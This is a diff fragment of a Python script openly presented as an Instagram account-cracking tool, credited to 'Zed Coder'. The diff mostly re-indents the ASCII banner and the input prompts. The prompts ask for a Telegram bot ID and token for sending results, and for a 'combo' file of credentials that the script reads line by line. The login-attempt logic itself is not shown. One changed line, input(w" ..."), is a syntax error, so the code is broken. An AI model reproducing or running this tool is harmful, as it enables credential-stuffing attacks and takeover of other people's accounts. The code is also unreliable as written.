@@ -8,27 +8,27 @@ import requests
 import subprocess
 import json
 logo='''
-██▓███   ▒█████   ██▓  ██████  ▒█████   ███▄    █ 
-▓██░  ██▒▒██▒  ██▒▓██▒▒██    ▒ ▒██▒  ██▒ ██ ▀█   █ 
-▓██░ ██▓▒▒██░  ██▒▒██▒░ ▓██▄   ▒██░  ██▒▓██  ▀█ ██▒
-▒██▄█▓▒ ▒▒██   ██░░██░  ▒   ██▒▒██   ██░▓██▒  ▐▌██▒
-▒██▒ ░  ░░  ████▓▒░░██░▒██████▒▒░ ████▓▒░▒██░  ▓██░
-▒▓▒░ ░  ░░ ▒░▒░▒░ ░▓  ▒ ▒▓▒ ▒ ░░ ▒░▒░▒░ ░ ▒░   ▒ ▒ 
-░▒ ░       ░ ▒ ▒░  ▒ ░░ ░▒  ░ ░  ░ ▒ ▒░ ░ ░░   ░ ▒░
-░░       ░ ░ ░ ▒   ▒ ░░  ░  ░  ░ ░ ░ ▒     ░   ░ ░ 
-            ░ ░   ░        ░      ░ ░           ░ 
----------------------------------------------------
-➣ Author   : Zed Coder
-➣ GitHub   : https://github.com/968hacker
-➣ YouTube  : Zed cracker
-➣ telegram : https://t.me/zed_cracker_1
----------------------------------------------------
-      Created By Zed Coder 
----------------------------------------------------
-  Crack instgram it started !
-   please wait .... 1h or 2h 
-   Prosess in Background !...
-==================================================='''
+ ██▓███   ▒█████   ██▓  ██████  ▒█████   ███▄    █ 
+ ▓██░  ██▒▒██▒  ██▒▓██▒▒██    ▒ ▒██▒  ██▒ ██ ▀█   █ 
+ ▓██░ ██▓▒▒██░  ██▒▒██▒░ ▓██▄   ▒██░  ██▒▓██  ▀█ ██▒
+ ▒██▄█▓▒ ▒▒██   ██░░██░  ▒   ██▒▒██   ██░▓██▒  ▐▌██▒
+ ▒██▒ ░  ░░  ████▓▒░░██░▒██████▒▒░ ████▓▒░▒██░  ▓██░
+ ▒▓▒░ ░  ░░ ▒░▒░▒░ ░▓  ▒ ▒▓▒ ▒ ░░ ▒░▒░▒░ ░ ▒░   ▒ ▒ 
+ ░▒ ░       ░ ▒ ▒░  ▒ ░░ ░▒  ░ ░  ░ ▒ ▒░ ░ ░░   ░ ▒░
+ ░░       ░ ░ ░ ▒   ▒ ░░  ░  ░  ░ ░ ░ ▒     ░   ░ ░ 
+             ░ ░   ░        ░      ░ ░           ░ 
+ ---------------------------------------------------
+ ➣ Author   : Zed Coder
+ ➣ GitHub   : https://github.com/968hacker
+ ➣ YouTube  : Zed cracker
+ ➣ telegram : https://t.me/zed_cracker_1
+ ---------------------------------------------------
+       Created By Zed Coder 
+ ---------------------------------------------------
+   Crack instgram it started !
+    please wait .... 1h or 2h 
+    Prosess in Background !...
+ ==================================================='''
 bad=0
 timeout=0
 hits=0
@@ -42,16 +42,16 @@ def instagram1():
 	r = requests.session()
 	import os, sys
 	print(logo2)
-	agar=input(wd+"    You Want To Bot TELEGRAM Your Results (y,yes or n,no) ")
+	agar=input(w" You Want To Bot TELEGRAM Your Results (y,yes or n,no) ")
 	if agar=='y' or agar=='yes' or agar=='Y' or agar=='YES' or agar=='Yes':
-		ID=input("    Your ID Telegram :")
-		token=input("    Token(bot) : ")
+		ID=input(" Your ID Telegram :")
+		token=input(" Token(bot) : ")
 	else:
 		pass
-	print(wd+'    ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~')
+	print(' ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~')
 	def loopPp():
 		try:
-			combo=input("     Path File >>> ")
+			combo=input(" Path File >>> ")
 			file = open(combo,'r').read().splitlines()
 			for line in file:
 				global bad, timeout, checkpoint, error, hits
